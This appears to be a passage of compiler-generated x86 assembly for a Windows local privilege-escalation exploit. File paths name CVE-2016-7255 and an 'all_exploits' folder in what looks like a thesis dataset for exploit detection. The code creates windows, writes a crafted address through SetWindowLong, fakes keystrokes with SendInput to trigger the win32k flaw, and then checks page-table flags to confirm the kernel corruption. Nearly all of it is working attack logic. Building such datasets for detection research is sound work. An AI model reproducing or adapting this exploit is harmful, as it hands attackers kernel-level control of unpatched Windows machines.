	mov	ecx, DWORD PTR _hWndParent$[ebp]
	push	ecx
	push	160					; 000000a0H
	push	160					; 000000a0H
	push	0
	push	0
	push	1355743232				; 50cf0000H
	mov	edx, DWORD PTR _pszTitleName$[ebp]
	push	edx
	mov	eax, DWORD PTR _pszClassName$[ebp]
	push	eax
	push	0
	call	DWORD PTR __imp__CreateWindowExW@48
	mov	DWORD PTR _hWndChild$[ebp], eax
; Line 335
	cmp	DWORD PTR _hWndChild$[ebp], 0
	jne	SHORT $LN9@or_address
; Line 337
	jmp	$LN3@or_address
$LN9@or_address:
; Line 343
	mov	ecx, DWORD PTR _pAddress$[ebp]
	sub	ecx, 20					; 00000014H
	mov	DWORD PTR _pId$[ebp], ecx
; Line 346
	mov	edx, DWORD PTR _pId$[ebp]
	push	edx
	push	-12					; fffffff4H
	mov	eax, DWORD PTR _hWndChild$[ebp]
	push	eax
	call	DWORD PTR __imp__SetWindowLongA@12
; Line 348
	mov	ecx, DWORD PTR _hWndChild$[ebp]
	push	ecx
	push	OFFSET $SG99248
	call	_DbgPrint
	add	esp, 8
; Line 350
	push	1
	mov	edx, DWORD PTR _hWndParent$[ebp]
	push	edx
	call	DWORD PTR __imp__ShowWindow@8
; Line 352
	call	DWORD PTR __imp__GetDesktopWindow@0
	push	eax
	mov	eax, DWORD PTR _hWndChild$[ebp]
	push	eax
	call	DWORD PTR __imp__SetParent@8
; Line 354
	mov	ecx, DWORD PTR _hWndChild$[ebp]
	push	ecx
	call	DWORD PTR __imp__SetForegroundWindow@4
; Line 356
	push	4
	call	__sim_alt_shift_tab
	add	esp, 4
; Line 358
	push	1
	mov	edx, DWORD PTR _hWndChild$[ebp]
	push	edx
	call	DWORD PTR __imp__SwitchToThisWindow@8
; Line 360
	call	__sim_alt_shift_esc
$LN5@or_address:
; Line 362
	push	0
	push	0
	push	0
	lea	eax, DWORD PTR _stMsg$[ebp]
	push	eax
	call	DWORD PTR __imp__GetMessageA@16
	test	eax, eax
	je	$LN2@or_address
; Line 364
	mov	ecx, DWORD PTR _hWndParent$[ebp]
	push	ecx
	call	DWORD PTR __imp__SetFocus@4
; Line 365
	push	20					; 00000014H
	call	__sim_alt_esc
	add	esp, 4
; Line 366
	mov	edx, DWORD PTR _hWndChild$[ebp]
	push	edx
	call	DWORD PTR __imp__SetFocus@4
; Line 367
	push	20					; 00000014H
	call	__sim_alt_esc
	add	esp, 4
; Line 369
	lea	eax, DWORD PTR _stMsg$[ebp]
	push	eax
	call	DWORD PTR __imp__TranslateMessage@4
; Line 370
	lea	ecx, DWORD PTR _stMsg$[ebp]
	push	ecx
	call	DWORD PTR __imp__DispatchMessageA@4
; Line 372
	mov	edx, DWORD PTR _value$[ebp]
	or	edx, DWORD PTR _value$[ebp+4]
	je	SHORT $LN10@or_address
; Line 373
	jmp	SHORT $LN2@or_address
$LN10@or_address:
; Line 377
	mov	DWORD PTR __$SEHRec$[ebp+20], 0
; Line 378
	mov	eax, DWORD PTR _PML4_SELF_REF
	mov	ecx, DWORD PTR [eax]
	mov	edx, DWORD PTR [eax+4]
	mov	DWORD PTR _value$[ebp], ecx
	mov	DWORD PTR _value$[ebp+4], edx
; Line 379
	mov	eax, DWORD PTR _value$[ebp]
	and	eax, 103				; 00000067H
	mov	ecx, DWORD PTR _value$[ebp+4]
	and	ecx, 0
	mov	DWORD PTR tv230[ebp], eax
	mov	DWORD PTR tv230[ebp+4], ecx
	cmp	DWORD PTR tv230[ebp], 103		; 00000067H
	jne	SHORT $LN11@or_address
	cmp	DWORD PTR tv230[ebp+4], 0
	jne	SHORT $LN11@or_address
; Line 380
	mov	edx, DWORD PTR _value$[ebp+4]
	push	edx
	mov	eax, DWORD PTR _value$[ebp]
	push	eax
	push	OFFSET $SG99252
	call	_printf
	add	esp, 12					; 0000000cH
; Line 381
	mov	DWORD PTR __$SEHRec$[ebp+20], -2	; fffffffeH
	jmp	SHORT $LN2@or_address
$LN11@or_address:
; Line 383
	mov	DWORD PTR __$SEHRec$[ebp+20], -2	; fffffffeH
	jmp	SHORT $LN20@or_address
$LN17@or_address:
; Line 384
	mov	eax, 1
$LN19@or_address:
	ret	0
$LN18@or_address:
	mov	esp, DWORD PTR __$SEHRec$[ebp]
; Line 385
	mov	DWORD PTR __$SEHRec$[ebp+20], -2	; fffffffeH
	jmp	$LN5@or_address
; Line 383
	mov	DWORD PTR __$SEHRec$[ebp+20], -2	; fffffffeH
$LN20@or_address:
; Line 388
	jmp	$LN5@or_address
$LN2@or_address:
; Line 391
	xor	ecx, ecx
	jne	$LN4@or_address
$LN3@or_address:
; Line 393
	cmp	DWORD PTR _hWndParent$[ebp], 0
	je	SHORT $LN13@or_address
; Line 395
	mov	edx, DWORD PTR _hWndParent$[ebp]
	push	edx
	call	DWORD PTR __imp__DestroyWindow@4
; Line 396
	mov	DWORD PTR _hWndParent$[ebp], 0
$LN13@or_address:
; Line 399
	cmp	DWORD PTR _hWndChild$[ebp], 0
	je	SHORT $LN14@or_address
; Line 401
	mov	eax, DWORD PTR _hWndChild$[ebp]
	push	eax
	call	DWORD PTR __imp__DestroyWindow@4
; Line 402
	mov	DWORD PTR _hWndChild$[ebp], 0
$LN14@or_address:
; Line 405
	push	0
	call	DWORD PTR __imp__GetModuleHandleW@4
	push	eax
	mov	ecx, DWORD PTR _pszClassName$[ebp]
	push	ecx
	call	DWORD PTR __imp__UnregisterClassW@8
; Line 407
	xor	eax, eax
$LN16@or_address:
; Line 408
	mov	ecx, DWORD PTR __$SEHRec$[ebp+8]
	mov	DWORD PTR fs:0, ecx
	pop	ecx
	pop	edi
	pop	esi
	pop	ebx
	mov	esp, ebp
	pop	ebp
	ret	0
_or_address_value_4 ENDP
_TEXT	ENDS
; Function compile flags: /Odtp
_TEXT	SEGMENT
_i$ = -4						; size = 4
_count$ = 8						; size = 4
__sim_alt_esc PROC
; File C:\Users\matti\Desktop\Magistrale\tesi\poc_detection\temp_dir\dataset_expansion_programs\manella\foobar\all_exploits\os_based\exp_db_41015_cve_id_CVE-2016-7255.c
; Line 249
	push	ebp
	mov	ebp, esp
	push	ecx
; Line 250
	mov	DWORD PTR _i$[ebp], 0
; Line 252
	mov	DWORD PTR _i$[ebp], 0
	jmp	SHORT $LN4@sim_alt_es
$LN2@sim_alt_es:
	mov	eax, DWORD PTR _i$[ebp]
	add	eax, 1
	mov	DWORD PTR _i$[ebp], eax
$LN4@sim_alt_es:
	mov	ecx, DWORD PTR _i$[ebp]
	cmp	ecx, DWORD PTR _count$[ebp]
	jge	SHORT $LN3@sim_alt_es
; Line 254
	push	18					; 00000012H
	call	__sim_key_down
	add	esp, 4
; Line 258
	push	27					; 0000001bH
	call	__sim_key_down
	add	esp, 4
; Line 259
	push	27					; 0000001bH
	call	__sim_key_up
	add	esp, 4
; Line 261
	push	27					; 0000001bH
	call	__sim_key_down
	add	esp, 4
; Line 262
	push	27					; 0000001bH
	call	__sim_key_up
	add	esp, 4
; Line 264
	push	18					; 00000012H
	call	__sim_key_up
	add	esp, 4
; Line 267
	jmp	SHORT $LN2@sim_alt_es
$LN3@sim_alt_es:
; Line 269
	xor	eax, eax
; Line 270
	mov	esp, ebp
	pop	ebp
	ret	0
__sim_alt_esc ENDP
_TEXT	ENDS
; Function compile flags: /Odtp
_TEXT	SEGMENT
_hWnd$ = -12						; size = 4
_nFinalRet$ = -8					; size = 4
_i$ = -4						; size = 4
_nCount$ = 8						; size = 4
__sim_alt_shift_tab PROC
; File C:\Users\matti\Desktop\Magistrale\tesi\poc_detection\temp_dir\dataset_expansion_programs\manella\foobar\all_exploits\os_based\exp_db_41015_cve_id_CVE-2016-7255.c
; Line 218
	push	ebp
	mov	ebp, esp
	sub	esp, 12					; 0000000cH
; Line 219
	mov	DWORD PTR _i$[ebp], 0
; Line 220
	mov	DWORD PTR _hWnd$[ebp], 0
; Line 223
	mov	DWORD PTR _nFinalRet$[ebp], -1
$LN4@sim_alt_sh:
; Line 227
	push	18					; 00000012H
	call	__sim_key_down
	add	esp, 4
; Line 228
	push	16					; 00000010H
	call	__sim_key_down
	add	esp, 4
; Line 231
	mov	DWORD PTR _i$[ebp], 0
	jmp	SHORT $LN7@sim_alt_sh
$LN5@sim_alt_sh:
	mov	eax, DWORD PTR _i$[ebp]
	add	eax, 1
	mov	DWORD PTR _i$[ebp], eax
$LN7@sim_alt_sh:
	mov	ecx, DWORD PTR _i$[ebp]
	cmp	ecx, DWORD PTR _nCount$[ebp]
	jge	SHORT $LN6@sim_alt_sh
; Line 233
	push	9
	call	__sim_key_down
	add	esp, 4
; Line 234
	push	9
	call	__sim_key_up
	add	esp, 4
; Line 236
	push	1000					; 000003e8H
	call	DWORD PTR __imp__Sleep@4
; Line 238
	jmp	SHORT $LN5@sim_alt_sh
$LN6@sim_alt_sh:
; Line 241
	push	18					; 00000012H
	call	__sim_key_up
	add	esp, 4
; Line 242
	push	16					; 00000010H
	call	__sim_key_up
	add	esp, 4
; Line 243
	xor	edx, edx
	jne	SHORT $LN4@sim_alt_sh
; Line 245
	mov	eax, DWORD PTR _nFinalRet$[ebp]
; Line 246
	mov	esp, ebp
	pop	ebp
	ret	0
__sim_alt_shift_tab ENDP
_TEXT	ENDS
; Function compile flags: /Odtp
_TEXT	SEGMENT
_i$ = -4						; size = 4
__sim_alt_shift_esc PROC
; File C:\Users\matti\Desktop\Magistrale\tesi\poc_detection\temp_dir\dataset_expansion_programs\manella\foobar\all_exploits\os_based\exp_db_41015_cve_id_CVE-2016-7255.c
; Line 191
	push	ebp
	mov	ebp, esp
	push	ecx
; Line 192
	mov	DWORD PTR _i$[ebp], 0
$LN4@sim_alt_sh:
; Line 196
	push	18					; 00000012H
	call	__sim_key_down
	add	esp, 4
; Line 197
	push	16					; 00000010H
	call	__sim_key_down
	add	esp, 4
; Line 200
	push	27					; 0000001bH
	call	__sim_key_down
	add	esp, 4
; Line 201
	push	27					; 0000001bH
	call	__sim_key_up
	add	esp, 4
; Line 203
	push	27					; 0000001bH
	call	__sim_key_down
	add	esp, 4
; Line 204
	push	27					; 0000001bH
	call	__sim_key_up
	add	esp, 4
; Line 206
	push	18					; 00000012H
	call	__sim_key_up
	add	esp, 4
; Line 207
	push	16					; 00000010H
	call	__sim_key_up
	add	esp, 4
; Line 210
	xor	eax, eax
	jne	SHORT $LN4@sim_alt_sh
; Line 212
	xor	eax, eax
; Line 213
	mov	esp, ebp
	pop	ebp
	ret	0
__sim_alt_shift_esc ENDP
_TEXT	ENDS
; Function compile flags: /Odtp
_TEXT	SEGMENT
_stInput$ = -28						; size = 28
_wKey$ = 8						; size = 2
__sim_key_up PROC
; File C:\Users\matti\Desktop\Magistrale\tesi\poc_detection\temp_dir\dataset_expansion_programs\manella\foobar\all_exploits\os_based\exp_db_41015_cve_id_CVE-2016-7255.c
; Line 174
	push	ebp
	mov	ebp, esp
	sub	esp, 28					; 0000001cH
; Line 175
	xor	eax, eax
	mov	DWORD PTR _stInput$[ebp], eax
	mov	DWORD PTR _stInput$[ebp+4], eax
	mov	DWORD PTR _stInput$[ebp+8], eax
	mov	DWORD PTR _stInput$[ebp+12], eax
	mov	DWORD PTR _stInput$[ebp+16], eax
	mov	DWORD PTR _stInput$[ebp+20], eax
	mov	DWORD PTR _stInput$[ebp+24], eax
$LN4@sim_key_up:
; Line 179
	mov	DWORD PTR _stInput$[ebp], 1
; Line 180
	mov	cx, WORD PTR _wKey$[ebp]
	mov	WORD PTR _stInput$[ebp+4], cx
; Line 181
	mov	DWORD PTR _stInput$[ebp+8], 2
; Line 183
	push	28					; 0000001cH
	lea	edx, DWORD PTR _stInput$[ebp]
	push	edx
	push	1
	call	DWORD PTR __imp__SendInput@12
; Line 185
	xor	eax, eax
	jne	SHORT $LN4@sim_key_up
; Line 187
	xor	eax, eax
; Line 188
	mov	esp, ebp
	pop	ebp
	ret	0
__sim_key_up ENDP
_TEXT	ENDS
; Function compile flags: /Odtp
_TEXT	SEGMENT
_stInput$ = -28						; size = 28
_wKey$ = 8						; size = 2
__sim_key_down PROC
; File C:\Users\matti\Desktop\Magistrale\tesi\poc_detection\temp_dir\dataset_expansion_programs\manella\foobar\all_exploits\os_based\exp_db_41015_cve_id_CVE-2016-7255.c
; Line 157
	push	ebp
	mov	ebp, esp
	sub	esp, 28					; 0000001cH
; Line 158
	xor	eax, eax
	mov	DWORD PTR _stInput$[ebp], eax
	mov	DWORD PTR _stInput$[ebp+4], eax
	mov	DWORD PTR _stInput$[ebp+8], eax
	mov	DWORD PTR _stInput$[ebp+12], eax
	mov	DWORD PTR _stInput$[ebp+16], eax
	mov	DWORD PTR _stInput$[ebp+20], eax
	mov	DWORD PTR _stInput$[ebp+24], eax
$LN4@sim_key_do:
; Line 162
	mov	DWORD PTR _stInput$[ebp], 1
; Line 163
	mov	cx, WORD PTR _wKey$[ebp]
	mov	WORD PTR _stInput$[ebp+4], cx
; Line 164
	mov	DWORD PTR _stInput$[ebp+8], 0
; Line 166
	push	28					; 0000001cH
	lea	edx, DWORD PTR _stInput$[ebp]
	push	edx
	push	1
	call	DWORD PTR __imp__SendInput@12
; Line 168
	xor	eax, eax
	jne	SHORT $LN4@sim_key_do
; Line 170
	xor	eax, eax
; Line 171
	mov	esp, ebp
	pop	ebp
	ret	0
__sim_key_down ENDP
_TEXT	ENDS
; Function compile flags: /Odtp
_TEXT	SEGMENT
_ulRet$ = -12						; size = 4
_VaList$ = -8						; size = 4
_pszDbgBuff$ = -4					; size = 4
_Format$ = 8						; size = 4
_DbgPrint PROC
; File C:\Users\matti\Desktop\Magistrale\tesi\poc_detection\temp_dir\dataset_expansion_programs\manella\foobar\all_exploits\os_based\exp_db_41015_cve_id_CVE-2016-7255.c
; Line 121
	push	ebp
	mov	ebp, esp
	sub	esp, 12					; 0000000cH
; Line 122
	mov	DWORD PTR _pszDbgBuff$[ebp], 0
; Line 123
	mov	DWORD PTR _VaList$[ebp], 0
; Line 124
	mov	DWORD PTR _ulRet$[ebp], 0
$LN4@DbgPrint:
; Line 128
	push	1024					; 00000400H
	push	0
	call	DWORD PTR __imp__GetProcessHeap@0
	push	eax
	call	DWORD PTR __imp__HeapAlloc@12
	mov	DWORD PTR _pszDbgBuff$[ebp], eax
; Line 129
	cmp	DWORD PTR _pszDbgBuff$[ebp], 0
	jne	SHORT $LN5@DbgPrint
; Line 131
	jmp	SHORT $LN3@DbgPrint
$LN5@DbgPrint:
; Line 133
	push	1024					; 00000400H
	push	0
	mov	eax, DWORD PTR _pszDbgBuff$[ebp]
	push	eax
	call	_memset
	add	esp, 12					; 0000000cH
; Line 135
	lea	ecx, DWORD PTR _Format$[ebp+4]
	mov	DWORD PTR _VaList$[ebp], ecx
; Line 137
	mov	edx, DWORD PTR _VaList$[ebp]
	push	edx
	mov	eax, DWORD PTR _Format$[ebp]
	push	eax
	push	1023					; 000003ffH
	mov	ecx, DWORD PTR _pszDbgBuff$[ebp]
	push	ecx
	call	__vsnprintf
	add	esp, 16					; 00000010H
; Line 140
	mov	edx, DWORD PTR _pszDbgBuff$[ebp]
	push	edx
	call	DWORD PTR __imp__OutputDebugStringA@4
; Line 142
	mov	DWORD PTR _VaList$[ebp], 0
; Line 144
	xor	eax, eax
	jne	SHORT $LN4@DbgPrint
$LN3@DbgPrint:
; Line 146
	cmp	DWORD PTR _pszDbgBuff$[ebp], 0
	je	SHORT $LN6@DbgPrint
; Line 148
	mov	ecx, DWORD PTR _pszDbgBuff$[ebp]
	push	ecx
	push	0
	call	DWORD PTR __imp__GetProcessHeap@0
	push	eax
	call	DWORD PTR __imp__HeapFree@12
; Line 149
	mov	DWORD PTR _pszDbgBuff$[ebp], 0
$LN6@DbgPrint:
; Line 152
	mov	eax, DWORD PTR _ulRet$[ebp]
; Line 153
	mov	esp, ebp
	pop	ebp
	ret	0
_DbgPrint ENDP
_TEXT	ENDS
; Function compile flags: /Odtp
;	COMDAT __vsnprintf
_TEXT	SEGMENT
__Buffer$ = 8						; size = 4
__BufferCount$ = 12					; size = 4
__Format$ = 16						; size = 4
__ArgList$ = 20						; size = 4
__vsnprintf PROC					; COMDAT
; File C:\Program Files (x86)\Windows Kits\10\include\10.0.19041.0\ucrt\stdio.h
; Line 1411
	push	ebp
	mov	ebp, esp
; Line 1412
	mov	eax, DWORD PTR __ArgList$[ebp]
	push	eax
	push	0
	mov	ecx, DWORD PTR __Format$[ebp]
	push	ecx
	mov	edx, DWORD PTR __BufferCount$[ebp]
	push	edx
	mov	eax, DWORD PTR __Buffer$[ebp]
	push	eax
	call	__vsnprintf_l
	add	esp, 20					; 00000014H
; Line 1413
	pop	ebp
	ret	0
__vsnprintf ENDP
_TEXT	ENDS
; Function compile flags: /Odtp
;	COMDAT __vsnprintf_l
_TEXT	SEGMENT
tv74 = -8						; size = 4
__Result$ = -4						; size = 4
__Buffer$ = 8						; size = 4
__BufferCount$ = 12					; size = 4
__Format$ = 16						; size = 4
__Locale$ = 20						; size = 4
__ArgList$ = 24						; size = 4
__vsnprintf_l PROC					; COMDAT
; File C:\Program Files (x86)\Windows Kits\10\include\10.0.19041.0\ucrt\stdio.h
; Line 1391
	push	ebp
	mov	ebp, esp
	sub	esp, 8
; Line 1392
	mov	eax, DWORD PTR __ArgList$[ebp]
	push	eax
	mov	ecx, DWORD PTR __Locale$[ebp]
	push	ecx
	mov	edx, DWORD PTR __Format$[ebp]
	push	edx
	mov	eax, DWORD PTR __BufferCount$[ebp]
	push	eax
	mov	ecx, DWORD PTR __Buffer$[ebp]
	push	ecx
	call	___local_stdio_printf_options
	mov	edx, DWORD PTR [eax]
	or	edx, 1
	mov	eax, DWORD PTR [eax+4]
	push	eax
	push	edx
	call	___stdio_common_vsprintf
	add	esp, 28					; 0000001cH
	mov	DWORD PTR __Result$[ebp], eax
; Line 1396
	cmp	DWORD PTR __Result$[ebp], 0
	jge	SHORT $LN3@vsnprintf_
	mov	DWORD PTR tv74[ebp], -1
	jmp	SHORT $LN4@vsnprintf_
$LN3@vsnprintf_:
	mov	ecx, DWORD PTR __Result$[ebp]
	mov	DWORD PTR tv74[ebp], ecx
$LN4@vsnprintf_:
	mov	eax, DWORD PTR tv74[ebp]
; Line 1397
	mov	esp, ebp
	pop	ebp
	ret	0
__vsnprintf_l ENDP
_TEXT	ENDS
; Function compile flags: /Odtp
;	COMDAT _printf
_TEXT	SEGMENT
__Result$ = -8						; size = 4
__ArgList$ = -4						; size = 4
__Format$ = 8						; size = 4
_printf	PROC						; COMDAT
; File C:\Program Files (x86)\Windows Kits\10\include\10.0.19041.0\ucrt\stdio.h
; Line 956
	push	ebp
	mov	ebp, esp
	sub	esp, 8
; Line 959
	lea	eax, DWORD PTR __Format$[ebp+4]
	mov	DWORD PTR __ArgList$[ebp], eax
; Line 960
	mov	ecx, DWORD PTR __ArgList$[ebp]
	push	ecx
	push	0
	mov	edx, DWORD PTR __Format$[ebp]
	push	edx
	push	1
	call	___acrt_iob_func
	add	esp, 4
	push	eax
	call	__vfprintf_l
	add	esp, 16					; 00000010H
	mov	DWORD PTR __Result$[ebp], eax
; Line 961
	mov	DWORD PTR __ArgList$[ebp], 0
; Line 962
	mov	eax, DWORD PTR __Result$[ebp]
; Line 963
	mov	esp, ebp
	pop	ebp
	ret	0
_printf	ENDP
_TEXT	ENDS
; Function compile flags: /Odtp
;	COMDAT __vfprintf_l
_TEXT	SEGMENT
__Stream$ = 8						; size = 4
__Format$ = 12						; size = 4
__Locale$ = 16						; size = 4
__ArgList$ = 20						; size = 4
__vfprintf_l PROC					; COMDAT
; File C:\Program Files (x86)\Windows Kits\10\include\10.0.19041.0\ucrt\stdio.h
; Line 644
	push	ebp
	mov	ebp, esp
; Line 645
	mov	eax, DWORD PTR __ArgList$[ebp]
	push	eax
	mov	ecx, DWORD PTR __Locale$[ebp]
	push	ecx
	mov	edx, DWORD PTR __Format$[ebp]
	push	edx
	mov	eax, DWORD PTR __Stream$[ebp]
	push	eax
	call	___local_stdio_printf_options
	mov	ecx, DWORD PTR [eax+4]
	push	ecx
	mov	edx, DWORD PTR [eax]
	push	edx
	call	___stdio_common_vfprintf
	add	esp, 24					; 00000018H
; Line 646
	pop	ebp
	ret	0
__vfprintf_l ENDP
_TEXT	ENDS
; Function compile flags: /Odtp
;	COMDAT ___local_stdio_printf_options
_TEXT	SEGMENT
___local_stdio_printf_options PROC			; COMDAT
; File C:\Program Files (x86)\Windows Kits\10\include\10.0.19041.0\ucrt\corecrt_stdio_config.h
; Line 90
	push	ebp
	mov	ebp, esp
; Line 92
	mov	eax, OFFSET ?_OptionsStorage@?1??__local_stdio_printf_options@@9@9 ; `__local_stdio_printf_options'::`2'::_OptionsStorage
; Line 93
	pop	ebp
	ret	0
___local_stdio_printf_options ENDP
_TEXT	ENDS
END
